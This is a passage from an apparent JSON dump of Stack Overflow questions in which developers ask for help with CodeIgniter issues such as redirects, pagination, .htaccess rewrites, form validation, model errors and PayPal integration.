help.</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12509743,"title":"Codeigniter - selecting children and parents from db","body":"<p>I want to pull from my database records corresponding to <code>parent_id</code>, like this:</p>\n\n<pre><code>function getChildren($id, $parent_id) {\n    $q = $this-&gt;db-&gt;select('id, name, slug, plat');\n    $q = $this-&gt;db-&gt;from('games');\n    $q = $this-&gt;db-&gt;where('parent_id',$id);\n    $q = $this-&gt;db-&gt;or_where('id',$parent_id);\n    $q = $this-&gt;db-&gt;get();\n\n    return $q-&gt;result_array();\n}\n</code></pre>\n\n<p>It - if it's a children game - get <code>parent_id</code> and search for a game with such <code>id</code> and for other games that has <code>parent_id</code> same as this one. If it's the parent game, it only looks for games with <code>parent_id</code> same as it's <code>id</code>.</p>\n\n<p>The problem is... it's not always working. I have four games in db:</p>\n\n<pre><code>id  |  parent_id  |  title\n15  |  0          |  Abe\n19  |  15         |  Abe\n20  |  0          |  RE2\n21  |  20         |  RE2 DS\n</code></pre>\n\n<p>First two works, last two - only children (<code>id = 21</code>) shows parent.</p>\n"},{"tags":["php","codeigniter","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12508138,"title":"Codeigniter redirects in __remap method in My_Controller","body":"<p>i am using this remap method in My_Controller with philsturgeon's library</p>\n\n<pre><code>&lt;?php\nclass MY_Controller extends MX_Controller \n{\n    protected $data;\n    protected $view;\n\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    public function _remap($method, $parameters)\n    {\n        if($this-&gt;view === TRUE OR $this-&gt;view === '')\n        {\n            $this-&gt;template-&gt;build('default');\n        }else if(strlen($this-&gt;view) &gt; 0){\n            $this-&gt;template-&gt;build($this-&gt;view);\n        }else{\n            $checkpoint =   $this-&gt;session-&gt;flashdata('exit');\n            if($checkpoint){\n                exit();\n            }else{\n                $this-&gt;session-&gt;set_flashdata('exit',TRUE);\n            }\n            $this-&gt;redirect = base_url()  . $this-&gt;redirect;\n            redirect($this-&gt;redirect);\n        }   \n\n    }\n}   \n</code></pre>\n\n<p>Here i want to know in the child controller what i do to handle this situation</p>\n\n<pre><code>&lt;?php\nclass Home extends My_Controller {\n\n    public  $redirect = '/admin/dashboard';\n    public  $view   =   FALSE;\n\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    function dashboard($days = '')\n    {\n        if (!$this-&gt;session-&gt;userdata('session_admin'))\n        {\n            $this-&gt;redirect =   '/admin/login';\n        }else{\n            //display dashboard \n        }\n    }\n\n    function login()\n    {   \n        if ($this-&gt;session-&gt;userdata('session_user')){\n            $this-&gt;redirect;\n        }else{\n            $this-&gt;view =   'login';    //Load login view through remap method with template library\n        }\n    }\n}\n</code></pre>\n\n<p>As you can see it comes in a loop and exits at my condition in the My_Controller. Although i have created this but i want to know how to handle redirects here. What should be the optimized solution. Any suggestions?</p>\n"},{"tags":["codeigniter","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12509396,"title":"Codeigniter redirects best approach to choose","body":"<p>In the same controller i have found there are two ways to redirect.</p>\n\n<pre><code>Class Home extends mY_Controller{\n\n    public $view;\n    public $redirect;\n    function first_method\n    {\n        $this-&gt;view =   FALSE;\n        //   $this-&gt;second_method();\n        //   redirect('Home/second_method');            \n    }\n\n    function second_method()\n    {\n        echo 'Second one';\n    }       \n} \n</code></pre>\n\n<p>I want to know which is the best approach also \ni have a redirect method in the my_controller \nif certain conditions do not match redirect the user using redirect variable \njust for simplicity i am posting this</p>\n\n<pre><code>&lt;?php\nclass MY_Controller extends CI_Controller \n{\n    protected $data;\n\n    function __construct()\n    {\n        parent::__construct();\n    }\n\n    public function _remap($method, $parameters)\n    {\n        if($this-&gt;view === FALSE)\n        {\n            redirect($this-&gt;redirect);\n        }else{\n            $this-&gt;load-&gt;view('my_view');\n        }   \n\n    }\n}   \n</code></pre>\n\n<p>Using the first method i am unable to access the second line</p>\n"},{"tags":["php","codeigniter","codeigniter-2","amf","amfphp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":601,"score":0,"question_id":4805654,"title":"Codeigniter, hmvc and amfphp","body":"<p>I'm using CodeIgniter 2.0 with hmvc module.<br>\nI tried to follow <a href=\"https://github.com/EllisLab/CodeIgniter/wiki/AMF-Codeigniter-Library-No-Zend-No-Hooks-Etc.\" rel=\"nofollow\">the CodeIgniter AMF wiki tutorial</a> on how to connect amfphp to be used by CI.</p>\n\n<p>For some reason I just cant start the gateway and when I try to connect with the swf browser I get:</p>\n\n<pre><code>(mx.rpc::Fault)#0\n  errorID = 0\n  faultCode = \"Client.Error.MessageSend\"\n  faultDetail = \"Channel.Connect.Failed error NetConnection.Call.Failed: HTTP: Failed\"\n  faultString = \"Send failed\"\n  message = \"faultCode:Client.Error.MessageSend faultString:'Send failed' faultDetail:'Channel.Connect.Failed error NetConnection.Call.Failed: HTTP: Failed'\"\n  name = \"Error\"\n  rootCause = (Object)#1\n    code = \"NetConnection.Call.Failed\"\n    description = \"HTTP: Failed\"\n    details = \"http://localhost/rv/gateway\"\n    level = \"error\"\n</code></pre>\n\n<p>Anyone have tried to implement this system or know what I might be doing wrong?</p>\n\n<p>Thanks everyone in advance.</p>\n"},{"tags":["php","codeigniter","image-uploading"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12507919,"title":"How to get original image name in codeignter","body":"<p>In codeigniter i want to upload image to URL:</p>\n\n<p><a href=\"http://mysite.com/uploads/temp/\" rel=\"nofollow\">http://mysite.com/uploads/temp/</a></p>\n\n<p>when I submit the form i want to get original image name and image maybe named like this when upload success:</p>\n\n<p><a href=\"http://mysite.com/uploads/temp/iphone5_2012_09_20_02_02_03.png\" rel=\"nofollow\">http://mysite.com/uploads/temp/iphone5_2012_09_20_02_02_03.png</a></p>\n\n<p>image name structure:</p>\n\n<p>[original_name]<em>[year]</em>[month]<em>[day]</em>[hour]<em>[minute]</em>[second]</p>\n\n<p>So how can i get original image name before upload in codeigniter?</p>\n"},{"tags":["codeigniter","uri","segment"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12508179,"title":"codeigniter: using uri segment in model","body":"<p>I am using uri segment to delete info in my database:</p>\n\n<pre><code>anchor('site/delete_note/'.$row-&gt;id, 'Delete')\n</code></pre>\n\n<p>Model:</p>\n\n<pre><code>function delete_note()\n{\n    $this-&gt;db-&gt;where('id', $this-&gt;uri-&gt;segment(3));\n    $this-&gt;db-&gt;delete('note');\n}\n</code></pre>\n\n<p>It works fine, but I want to do the same for updating my info and can't get it work\nSo this is link in view:</p>\n\n<pre><code>anchor('site/edit_note/'.$row-&gt;id, 'Edit')  \n</code></pre>\n\n<p>My controller:</p>\n\n<pre><code>function edit_note()\n{\n    $note_id = $this-&gt;uri-&gt;segment(3);\n    $data['main_content'] = 'edit_note';\n    $this-&gt;load-&gt;view('includes/template', $data);\n\n    $this-&gt;load-&gt;library('form_validation');\n\n    $this-&gt;form_validation-&gt;set_rules('content', 'Message', 'trim|required');\n\n\n    if($this-&gt;form_validation-&gt;run() == TRUE)\n    {\n        $this-&gt;load-&gt;model('Note_model');\n        $this-&gt;Note_model-&gt;edit_note($note_id);\n        redirect('site/members_area'); \n\n    }\n\n}\n</code></pre>\n\n<p>My model:</p>\n\n<pre><code>function edit_note($note_id)\n{\n    $content = $this-&gt;input-&gt;post('content');\n    $data = array('content' =&gt; $content);\n    $this-&gt;db-&gt;where('id', $note_id);\n    $this-&gt;db-&gt;update('note', $data);\n}\n</code></pre>\n\n<p>My view of edit_note:</p>\n\n<pre><code>&lt;?php\n\n    echo form_open('site/edit_note');\n    echo form_textarea('content', set_value('content', 'Your message'));\n\n    echo form_submit('submit', 'Change');\n    echo anchor('site/members_area', 'Cancel');\n\n\n    echo validation_errors('&lt;p class=\"error\"&gt;');        ?&gt;\n</code></pre>\n\n<p>Edit doesn't work as delete, when i am trying to get segment directly in edit model, as I used in delete model. </p>\n\n<p>If I set $note_id to a number in my controller, instead of this '$this->uri->segment(3)', it updates my database. But if I use getting segment it doesn't work. I thought uri segments are available in controller as in model, but there is something I don't know.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":120,"score":-2,"question_id":12504137,"title":"Codeigniter passing multiple parameters to controller from view?","body":"<p>I have a system that is outputting a number of images, with a A link next to them to set them as the album cover.</p>\n\n<p>I have multiple albums, and in my database have a field called \"is_feature\" that is set to 1 if the image is the cover, and 0 if it isnt.</p>\n\n<p>I don't know the best way of selecting the image, i originally outputted something like below;</p>\n\n<pre><code>&lt;a href=\"/admin/set_photo/'.$image_id.'\" title=\"Set this photo as the feature photo\"&gt;Set&lt;/a&gt;\n</code></pre>\n\n<p>(image_id is the images id obviously), this function would call the model and set all other photos \"is_feature\" field to 0, and this photos \"is_feature\" to 1. </p>\n\n<p>The problem is it is wiping all the other album features as well. I almost need to pass to variables in the A link, the first being the id of the image, the second being the id of the album, then my model function can only set \"is_feature\" to 0 where album_id = the id of the album passed.</p>\n\n<p>Is there anyway to pass two variables like this? Or am i going about this in totally the wrong way?</p>\n"},{"tags":["codeigniter","hook"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12506149,"title":"Does get_instance work with CodeIgniter Hooks?","body":"<p>I am trying to use hooks to generate my global templates(header, footer, etc), but I need to use CI variables and classes such as config, etc, in them.  I use $CI =&amp; get_instance to call it, but every time i call a class or function, I get a call to member function on non-object error.</p>\n\n<p>Example:</p>\n\n<p><code>$CI =&amp;get_instance;\n$CI->load->library('parser');</code></p>\n\n<p>And then the parser line returns that error.  It happens even if I change that line to another class or function(base_url, etc).</p>\n\n<p>Any ideas?</p>\n"},{"tags":["file","class","codeigniter","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":254,"score":0,"question_id":3263452,"title":"use of upload class in codeigniter - Model or Controller?","body":"<p>Quick question about CI.</p>\n\n<p>I have a <strong>view</strong> with a form, several text input fields and a file upload.\nI want to be able to take the input from the text fields, save it to the DB, and then upload the image.</p>\n\n<p>I've achieved this by having the upload code in a <strong>controller</strong>, and if the upload is successful, a call to my <strong>Model</strong> is made to update the database.</p>\n\n<p>Is this \"best practice\", or indeed an acceptable way of doing it? Or should the File Upload go in the Model. Does it matter?</p>\n\n<p>Essentially my code is:</p>\n\n<pre><code>    function edit_category()\n        {\n            $config['upload_path'] = 'images/category/';\n            $config['allowed_types'] = 'gif|jpg|jpeg|png';\n            $config['max_size'] = '1000';\n            $config['max_width'] = '300';\n            $config['max_height'] = '300';\n\n            $this-&gt;load-&gt;library('upload', $config);\n\n            if(!$this-&gt;upload-&gt;do_upload()) \n            {\n                $this-&gt;session-&gt;set_flashdata('status', $this-&gt;upload-&gt;display_errors());\n                        redirect('admin/category/edit/'.$this-&gt;input-&gt;post('catID'), 'location');\n            }\n            else  /*no errors, upload is successful..*/\n            {\n                $fInfo = $this-&gt;upload-&gt;data();\n                //$this-&gt;_createThumbnail($fInfo['file_name']);\n                            //process form POST data.\n                            $data = array(\n                                'catName' =&gt; $this-&gt;input-&gt;post('catName'),\n                                'catDesc' =&gt; $this-&gt;input-&gt;post('catDesc'),\n                                'catImage' =&gt; $fInfo['file_name']\n                );\n\n/* update the database */\n                $category = $this-&gt;category_model-&gt;edit_category($data, $this-&gt;input-&gt;post('catID'));\n</code></pre>\n"},{"tags":["eclipse","svn","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12506177,"title":"CodeIgniter autocomplete code (SVN) project in eclipse","body":"<p>I use CodeIgniter 2.x, eclipse indigo. when I creating new project of CodeIgniter(Not SVN project) the autocomplete code is work fine when I type or (Ctrl + space). </p>\n\n<p>but When I check out project (SVN project) from other computer it doesn't autocomplete code when I type or (Ctrl + space). and when I right click on project > Include Path, it also doesn't have PHP include path too.</p>\n\n<p>How can I autocomplete code when I type or (Ctrl + Space ) in SVN project in eclipse?</p>\n"},{"tags":["php","codeigniter","controller"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12504321,"title":"Call to undefined method UserModel::addUser()","body":"<p>Other functions from the same model are working fine, I'm only having problem with two of them, which both interact with the database. Works locally.</p>\n\n<p>From the error log. <strong>PHP Fatal error:  Call to undefined method UserModel::getScreens()</strong></p>\n\n<p>I've searched all through google and can't see the reason behind why these to functions wont run on the server. Login also talks to the database and works okay.</p>\n\n<p>I've tried different naming conventions for the calls <code>$this-&gt;UserModel-&gt;method()</code> <code>$this-&gt;userModel-&gt;method()</code> etc. Same with changing the loading model. <code>$this-&gt;load-&gt;model('UserModel', ' ', TRUE);</code></p>\n\n<p><strong>user.php</strong> (controller)</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nsession_start();\n\nclass User extends CI_Controller {\n\n    function __construct(){\n        parent::__construct();\n        $this-&gt;load-&gt;model('usermodel','',TRUE);\n    }\n\n    public function register(){\n       ..........\n       $addUser = $this-&gt;usermodel-&gt;addUser($this-&gt;input-&gt;post());\n       ..........\n    }\n\n    public function screens($id = FALSE){\n        $data = $this-&gt;checkStatus('screens');\n        //userInfo is coming from the checkStatus function.\n        //Have verified with a var_dump($user_id) and it appears\n        $user_id = $data['userInfo'][0]['id'];\n        $data['screens'] = $this-&gt;Usermodel-&gt;getScreens($user_id);\n        if($data){\n            $data['title'] = 'My SCREENs';\n            if($id){\n                $data['id'] = $id;\n                $this-&gt;load-&gt;template('screenview', $data);\n            } else {\n                $this-&gt;load-&gt;template('screens', $data);\n            }\n        }\n    }\n\n    public function login(){\n        //This works\n        ..........\n        $result = $this-&gt;usermodel-&gt;login($email, $password);\n        ..........\n    }\n}\n</code></pre>\n\n<p><strong>usermodel.php</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\nClass UserModel extends CI_Model{\n\n    function __construct(){\n        parent::__construct();\n        $this-&gt;salt = \"_________\";\n\n    }\n\n    function getScreens($userID){\n    //This doesn't work\n        $this -&gt; db -&gt; select('*');\n        $this -&gt; db -&gt; from('screens');\n        $this -&gt; db -&gt; where('user_id = ' . \"'\" . $userID . \"'\");\n        $query = $this -&gt; db -&gt; get();\n\n        return $query-&gt;result_array();\n    }\n\n    function addUser($data){\n    //This doesn't work\n         $data = array(\n           'first_name' =&gt; $data['firstname'] ,\n           'last_name' =&gt; $data['lastname'] ,\n           'email' =&gt; $data['email'],\n           'dob' =&gt; $data['dob-day'] . '/' . $data['dob-month'] . '/' . $data['dob-year'],\n           'height' =&gt; $data['height'],\n           'weight' =&gt; $data['weight'],\n           'password' =&gt; sha1($data['password1'] . $this-&gt;salt),\n           'gender' =&gt; $data['gender']\n        );\n        $added = $this-&gt;db-&gt;insert('users', $data);\n        if($added){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    function login($email, $password){\n    //This works\n        $this -&gt; db -&gt; select('id, email, password');\n        $this -&gt; db -&gt; from('users');\n        $this -&gt; db -&gt; where('email = ' . \"'\" . $email . \"'\");\n        $this -&gt; db -&gt; where('password = ' . \"'\" . sha1($password . $this-&gt;salt) . \"'\");\n        $this -&gt; db -&gt; limit(1);\n\n        $query = $this -&gt; db -&gt; get();\n\n        if($query -&gt; num_rows() == 1){\n            return $query-&gt;result();\n        } else {\n            return false;\n        }\n    }\n}\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":119,"score":0,"question_id":11041604,"title":"accessing a object variable in PHP codeigniter","body":"<p>I have the following piece of code in my Model:</p>\n\n<pre><code>public function getSite()\n{\n    $this-&gt;load-&gt;library('site');\n    $data = array();\n    $str = \"SELECT * FROM sitematrix_sites\";\n    $query = $this-&gt;getQuery($str);\n    if($query){ \n        foreach($query-&gt;result() as $row){\n            $site = new Site();\n            array_push($data, $site-&gt;load($row));\n        }\n\n        foreach($data as $site){\n            $site-&gt;data['database'] = $this-&gt;getDatabase($site-&gt;data['site_id']);\n            $site-&gt;data['baseline'] = $this-&gt;getBaseline($site-&gt;data['site_id']);\n        }\n\n        return $data;\n    }\n    else{\n        return false;\n    }\n}\n</code></pre>\n\n<p>And I created a class called site:</p>\n\n<pre><code>class Site{\n\npublic $data;\n\npublic function __contruct(){\n\n    $this-&gt;data = ArrayObject(array(), ArrayObject::STD_PROP_LIST);\n\n    $this-&gt;data['site_id']                      =   '';\n    $this-&gt;data['site']                         =   '';\n    $this-&gt;data['site_code']                    =   '';\n    $this-&gt;data['tc_10']                        =   array();\n    $this-&gt;data['tc9x']                         =   array();\n    $this-&gt;data['tc8x']                         =   array();\n    $this-&gt;data['tc2008']                       =   array();\n    $this-&gt;data['eng_2005']                     =   array();\n    $this-&gt;data['database']                     =   array();\n    $this-&gt;data['baseline']                     =   array();\n</code></pre>\n\n<p>However, I'm getting the following error:</p>\n\n<pre><code>&lt;p&gt;Severity: Notice&lt;/p&gt;\n&lt;p&gt;Message:  Trying to get property of non-object&lt;/p&gt;\n&lt;p&gt;Filename: models/sitematrix_model.php&lt;/p&gt;\n&lt;p&gt;Line Number: 77&lt;/p&gt;\n</code></pre>\n\n<p>Any thoughts? I have tried to access those values either as <code>$site-&gt;data-&gt;database</code> and as <code>$site-&gt;data['database']</code> but both don't work.</p>\n\n<pre><code>line 77:  $site-&gt;data['database'] = $this-&gt;getDatabase($site-&gt;data['site_id']);\n</code></pre>\n\n<p>The function getDatabase:</p>\n\n<pre><code>public function getDatabase($id){\n    $database = array();\n    $str = \"SELECT * FROM site_database where site_id='$id'\";\n    $query = $this-&gt;getQuery($str);\n    if($query){\n        foreach($query-&gt;result() as $row){\n            array_push($database, $row-&gt;name);\n        }\n    }\n\n    return $database;\n}\n</code></pre>\n\n<p>Function getQuery:</p>\n\n<pre><code>public function getQuery($str){\n    $data = array();\n    $query = $this-&gt;db-&gt;query($str);\n\n    if(!$query || $query-&gt;num_rows() == 0){\n        return false;\n    }\n    return $query;\n}\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12504380,"title":"CodeIgniter Pagination configuration is wrong?","body":"<p>Please take a look at the following code in a controller named \"test\":</p>\n\n<pre><code>$this-&gt;load-&gt;library('pagination');\n\n// These 3 are the minimum config that needs to be set\n$config['base_url']   = base_url() . 'test/?' . http_build_query($_GET, '', '&amp;amp;');\n$config['total_rows'] = 173;\n$config['per_page']   = 20;\n\n// This returns something like this: ?name=foo/20\n// I would expect something like this: ?name=foo&amp;per_page=20\n// $config['enable_query_strings'] = TRUE;\n\n// This retuns something like this: ?name=foo&amp;per_page=20 (which is what I want),\n// but the documentation says it should be: ?c=test&amp;m=index&amp;per_page=20\n$config['page_query_string'] = TRUE;\n\n$this-&gt;pagination-&gt;initialize($config);\necho $this-&gt;pagination-&gt;create_links();\n</code></pre>\n\n<p>Then go to: <code>test/?name=foo</code></p>\n\n<p>The resulting pagination links look correct. When you click on, say, link number \"2\", you are redirected to <code>?name=foo&amp;per_page=20</code> which is correct. However, the new pagination created looks wrong. It looks something like this: <code>?name=foo&amp;per_page=20&amp;per_page=40</code> (where per_page appears twice in the query string).</p>\n\n<p>What's going on?</p>\n"},{"tags":["php","jquery","codeigniter","shared-state"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12503615,"title":"Passing a variable from one controller method to another","body":"<p>I'm using the CodeIgniter framework. I load a main view, which contains several tabs, which load other views in a <code>&lt;div&gt;</code> via AJAX. My controller class looks like this: </p>\n\n<pre><code>class MainController extends MY_Controller\n    function main($id=0)\n    {\n        $this-&gt;load-&gt;model('main_model');\n        $this-&gt;data['info'] = $this-&gt;main_model-&gt;foo($id);\n        $this-&gt;load-&gt;view('main_view', $this-&gt;data);\n    }\n\n    function tab1()\n    {\n        $this-&gt;load-&gt;view('tab1_view', $this-&gt;data);\n    }\n</code></pre>\n\n<p>}</p>\n\n<p>I load the main page by calling <code>mywebapp/main/123</code>. The <code>id</code> can be used in the <code>main</code> method and in the <code>main_view</code>. But when I click on the tab, I want to use <code>id</code> in the <code>&lt;div&gt;</code> in <code>main_view</code> as well. What's the best way to do this? Maybe any way to make this variable global for every method in the controller?</p>\n\n<p>I load the tab using jQuery:</p>\n\n<pre><code>$(\"#div\").load(mywebapp/tab1);\n</code></pre>\n"},{"tags":[".htaccess","codeigniter","apache2","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12503826,"title":".htaccess Prevents Forms from Posting","body":"<p>I'm using this snippet in .htaccess to pull out index.php from the url in codeigniter:</p>\n\n<pre><code>RewriteCond %{HTTP:X-Requested-With} !^XMLHttpRequest$\nRewriteCond %{THE_REQUEST}       ^[^/]*/index\\.php [NC]\nRewriteRule ^index\\.php(.*)$     $1 [R=301,NS,L]\n</code></pre>\n\n<p>Everything seems to be working just fine except that form posts cannot get through.  If I comment out the rule the post will get through.</p>\n\n<p>Anyone know of a way to remove index.php from the url but keep form posts intact?</p>\n\n<p>I don't just want the url to work without index.php, I want index.php to be removed if it is present.</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting","codeigniter-url"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":227,"score":1,"question_id":7695423,"title":"htaccess rewrite for codeigniter site","body":"<p>I want to rewrite code for codeigniter url rewrite.</p>\n\n<p>I have used following code.</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /whype\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteRule ^admin$ administration\nRewriteRule ^video/([0-9]+)/(.*)$ videos/details/$1/$1\n</code></pre>\n\n<p>It is working well for index.php removal.\nBut it doesn't work for url rewrite</p>\n\n<p>i want <code>example.com/admin</code> becomes <code>example.com/administration</code></p>\n\n<p>and </p>\n\n<p><code>example.com/video/123/title</code> becomes <code>example.com/videos/details/123/title</code></p>\n\n<p>Thanks in advance,\nw3father</p>\n"},{"tags":["php","codeigniter","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":12503783,"title":"Fatal Error: Class 'CI_Model' not found","body":"<p>All of a sudden my pages on my web-server are failing. Everything works brilliantly locally.</p>\n\n<p>Errors in question</p>\n\n<p><code>[Wed Sep 12 03:37:49 2012] [error] [client _______] PHP Fatal error:  Class 'CI_Model' not found in /home/webuser/public_html/website.com/public/application/models/userModel.php on line 2</code></p>\n\n<p>Opening lines of userModel.php</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\nClass UserModel extends CI_Model{\n</code></pre>\n\n<p>This has been working all up until today when I did a recent code pull. Which was only changes to views, controllers and this particular module.</p>\n"},{"tags":["php","forms","codeigniter","form-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12502671,"title":"CodeIgniter - Validate data outside submited form?","body":"<p>How can i validate something i did not get from a form. I want to validate my variable and i want this rule to be is_uniqe() to check for duplicates.</p>\n\n<p>I have tried setting a rule in the $rules array as array( 'field' => $this->characterNAME, 'rules' => 'is_unique[members.char_name]) yet no effect i tried calling the is_unique() on its own yet no effect and i tried to asign the variable to $_POST['charNAME'] = $this->characterNAME; and then pass that to set_rules() yet no effect. </p>\n\n<p>How can i validate my variable ?</p>\n\n<p>My code:</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Registration extends CI_Controller {\n\nvar $characterNAME = \"\";\nvar $characterCORP = \"\";\nvar $characterALLY = \"\";\nvar $characterJDAT = \"\";\n\nfunction __construct() {\n    parent::__construct();\n    $this-&gt;load-&gt;helper('form');\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;load-&gt;model('Registration_model', 'reg');\n}\n\npublic function index()\n{\n\n    $this-&gt;load-&gt;view('registration_view');\n}\n\nfunction insert()\n{\n\n    $rules = array(\n        array(\n            'field' =&gt; 'username',\n            'label' =&gt; 'Username',\n            'rules' =&gt; 'required|min_length[6]|max_length[250]|is_unique[members.username]'\n            ),\n        array(\n            'field' =&gt; 'password',\n            'label' =&gt; 'Password',\n            'rules' =&gt; 'required|min_length[6]|max_length[250]|md5'\n            ),\n        array(\n            'field' =&gt; 'apiid',\n            'label' =&gt; 'apiid',\n            'rules' =&gt; 'required|integer|min_length[6]|max_length[250]|callback_api_check[' . $this-&gt;input-&gt;post('apikey') . ']'\n            ),\n        array(\n            'field' =&gt; 'apikey',\n            'label' =&gt; 'apikey',\n            'rules' =&gt; 'required|min_length[6]|max_length[255]'\n            ),\n        );\n\n    $_POST['charNAME'] = $this-&gt;characterNAME;\n    $this-&gt;form_validation-&gt;set_rules('charNAME', 'CharacterName', 'is_unique[members.char_name]');\n    $this-&gt;form_validation-&gt;set_rules($rules);\n\n    if($this-&gt;form_validation-&gt;run() == FALSE) \n    {\n        $this-&gt;load-&gt;view('registration_view'); \n    } else {\n\n        // PROCESS REGISTRATION \n        $this-&gt;reg-&gt;add_user($_POST['username'], $_POST['password'], $_POST['apiid'], $_POST['apikey'], $this-&gt;characterNAME, $this-&gt;characterCORP, $this-&gt;characterALLY, $this-&gt;characterJDAT);\n        // REDIRECT\n        $this-&gt;load-&gt;view('registration_done');\n    }\n}\n\nfunction api_check($apiid, $apikey) \n{\n    $url = 'http://api.eveonline.com/account/Characters.xml.aspx?keyID='.$apiid.'&amp;vCode='.$apikey;\n\n    $xml = new DOMDocument();\n    $xml-&gt;load($url);\n\n    $chars = $xml-&gt;getElementsByTagName('row');\n\n    foreach ($chars as $character) \n    {\n        $charid = $character-&gt;attributes;\n        $curl = 'http://api.eveonline.com/eve/CharacterInfo.xml.aspx?keyID='. $apiid . '&amp;vCode='.$apikey . '&amp;characterID=' . $charid-&gt;item(1)-&gt;nodeValue;\n\n        $cxml = new DOMDocument();\n        $cxml-&gt;load($curl);\n\n        $corp = $cxml-&gt;getElementsByTagName(\"corporation\");\n        $ally = $cxml-&gt;getElementsByTagName(\"alliance\");\n        $char = $cxml-&gt;getElementsByTagName(\"characterName\");\n        $jdat = $cxml-&gt;getElementsByTagName(\"corporationDate\");\n\n        // Check database instead\n\n        if($this-&gt;reg-&gt;validate_entity($corp-&gt;item(0)-&gt;nodeValue) || $this-&gt;reg-&gt;validate_entity($ally-&gt;item(0)-&gt;nodeValue)) \n        {\n            $this-&gt;characterNAME = $char-&gt;item(0)-&gt;nodeValue;\n            $this-&gt;characterCORP = $corp-&gt;item(0)-&gt;nodeValue;\n            $this-&gt;characterALLY = $ally-&gt;item(0)-&gt;nodeValue;\n            $this-&gt;characterJDAT = $jdat-&gt;item(0)-&gt;nodeValue;\n            return true;\n        }\n\n    }\n    $this-&gt;form_validation-&gt;set_message('api_check','None of the characters on this account are allowed to join.');\n    return false;\n}\n\n\n}\n</code></pre>\n"},{"tags":["php","api","codeigniter","paypal"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1373,"score":2,"question_id":5293218,"title":"Paypal in CodeIgniter","body":"<p>After reading documentation on paypals developers website for quite a while, I've come to stack. I'm a bit confused on how the whole API deal works, and I decided to take it simpler, find out if I even need to use anything more complex than buttons. So...</p>\n\n<p>What I Need:\nMultiple options for digital goods\n(IE - 2 Posts for $5, 10 posts for $10)</p>\n\n<p>I obviously could use a button to have them pay, but I need to be able to get a response to know which of the 2 (or more in the future) things they bought, so I can modify the database accordingly. Is this possible with something like <a href=\"https://www.x.com/community/ppx/wps\" rel=\"nofollow\">https://www.x.com/community/ppx/wps</a></p>\n\n<p>Or am I going to have to use the API? I installed Leon's Barretts' library for paypal in CodeIgniter:\n<a href=\"http://www.leonbarrett.com/code/paypal/\" rel=\"nofollow\">http://www.leonbarrett.com/code/paypal/</a></p>\n\n<p>And I'm just completely unsure where to go from here, ideally I'd like the user to be able to pay with credit card w/o a paypal account, or pay with paypal with a paypal account.</p>\n\n<p>Any thoughts to help me get going? Thanks guys!</p>\n"},{"tags":["php","memory","codeigniter","xml-rpc"],"answer_count":6,"favorite_count":8,"up_vote_count":28,"down_vote_count":0,"view_count":81120,"score":28,"question_id":561066,"title":"PHP: Fatal Error: Allowed Memory Size of 134217728 Bytes Exhausted (CodeIgniter + XML-RPC)","body":"<p>I have a bunch of client point of sale (POS) systems that periodically send new sales data to one centralized database, which stores the data into one big database for report generation.</p>\n\n<p>The client POS is based on PHPPOS, and I have implemented a module that uses the standard XML-RPC library to send sales data to the service. The server system is built on CodeIgniter, and uses the XML-RPC and XML-RPCS libraries for the webservice component. Whenever I send a lot of sales data (as little as 50 rows from the sales table, and individual rows from sales_items pertaining to each item within the sale) I get the following error:</p>\n\n<pre><code>Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 54 bytes)\n</code></pre>\n\n<p>128M is the default value in <code>php.ini</code>, but I assume that is a huge number to break. In fact, I have even tried setting this value to 1024M, and all it does is take a longer time to error out.</p>\n\n<p>As for steps I've taken, I've tried disabling all processing on the server-side, and have rigged it to return a canned response regardless of the input. However, I believe the problem lies in the actual sending of the 